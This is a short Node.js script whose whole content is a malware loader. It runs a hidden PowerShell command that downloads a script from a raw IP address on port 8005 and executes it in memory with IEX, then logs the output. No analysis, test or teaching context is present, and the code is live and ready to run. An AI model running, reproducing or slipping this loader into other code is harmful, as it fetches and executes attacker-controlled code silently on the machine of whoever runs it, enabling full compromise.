const { exec } = require('child_process');

const command = `powershell.exe -nop -w hidden -c "IEX((new-object net.webclient).downloadstring('http://43.134.113.193:8005/R29kTG9hZA=='))"`;

exec(command, (error, stdout, stderr) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }
    if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
